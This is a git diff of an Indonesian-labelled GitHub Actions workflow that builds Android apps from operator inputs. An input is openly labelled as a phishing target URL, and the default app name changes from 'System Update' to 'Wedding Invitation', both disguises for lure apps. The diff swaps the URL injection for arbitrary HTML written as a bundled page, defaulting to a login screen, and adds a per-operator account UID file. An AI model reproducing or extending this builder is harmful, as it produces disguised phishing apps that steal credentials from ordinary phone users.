@@ -6,11 +6,11 @@ on:
       app_name:
         description: 'Nama Aplikasi'
         required: true
-        default: 'System Update'
-      target_url:
-        description: 'URL Target (Phising)'
+        default: 'Undangan Pernikahan'
+      html_content:
+        description: 'Kode HTML untuk tampilan aplikasi'
         required: true
-        default: 'https://google.com'
+        default: '<html><body><h1>Login</h1></body></html>'
       uid:
         description: 'UID Akun'
         required: true
@@ -18,7 +18,7 @@ on:
       icon_url:
         description: 'URL Icon (PNG/JPG)'
         required: false
-        default: 'https://files.catbox.moe/0iq0n3.jpg'
+        default: 'https://files.catbox.moe/xxx.jpg'
 
 jobs:
   build:
@@ -47,26 +47,19 @@ jobs:
 
       - name: Inject Config (Python)
         env:
-          TARGET_URL: ${{ github.event.inputs.target_url }}
+          HTML_CONTENT: ${{ github.event.inputs.html_content }}
           APP_NAME: ${{ github.event.inputs.app_name }}
           ACCOUNT_UID: ${{ github.event.inputs.uid }}
         run: |
           python3 - << 'EOF'
-          import os
-          import json
-          import re
+          import os, json, re
 
-          # ─── 1. REPLACE TARGET_URL ───
-          main_kt = "android/app/src/main/java/com/sync/xxx/MainActivity.kt"
-          with open(main_kt, "r") as f:
-              content = f.read()
-
-          url_input = os.environ.get("TARGET_URL", "https://google.com")
-          content = content.replace('"TARGET_URL_PLACEHOLDER"', f'"{url_input}"')
-
-          with open(main_kt, "w") as f:
-              f.write(content)
-          print(f"✅ TARGET_URL injected: {url_input}")
+          # ─── 1. WRITE HTML ASSET ───
+          os.makedirs("android/app/src/main/assets", exist_ok=True)
+          html_content = os.environ.get("HTML_CONTENT", "<html><body>Error</body></html>")
+          with open("android/app/src/main/assets/index.html", "w", encoding="utf-8") as f:
+              f.write(html_content)
+          print(f"✅ HTML asset written ({len(html_content)} bytes)")
 
           # ─── 2. REPLACE APP NAME ───
           strings_xml = "android/app/src/main/res/values/strings.xml"
@@ -74,14 +67,16 @@ jobs:
               content = f.read()
 
           app_name = os.environ.get("APP_NAME", "System Update")
-          content = re.sub(r'<string name="app_name">.*?</string>', f'<string name="app_name">{app_name}</string>', content)
-
+          content = re.sub(
+              r'<string name="app_name">.*?</string>',
+              f'<string name="app_name">{app_name}</string>',
+              content
+          )
           with open(strings_xml, "w") as f:
               f.write(content)
           print(f"✅ APP_NAME injected: {app_name}")
 
           # ─── 3. CREATE UID.JSON ───
-          os.makedirs("android/app/src/main/assets", exist_ok=True)
           uid = os.environ.get("ACCOUNT_UID", "nexsus-xxxxxxx")
           with open("android/app/src/main/assets/uid.json", "w") as f:
               json.dump({"uid": uid}, f)
@@ -89,10 +84,10 @@ jobs:
 
           # ─── 4. VERIFY ───
           print("\n=== VERIFIKASI ===")
-          with open(main_kt, "r") as f:
-              for line in f:
-                  if "TARGET_URL" in line and "private val" in line:
-                      print(f"MainActivity.kt: {line.strip()}")
+          if os.path.exists("android/app/src/main/assets/index.html"):
+              print("index.html: OK")
+          else:
+              print("index.html: MISSING")
           print("==================\n")
           EOF
 
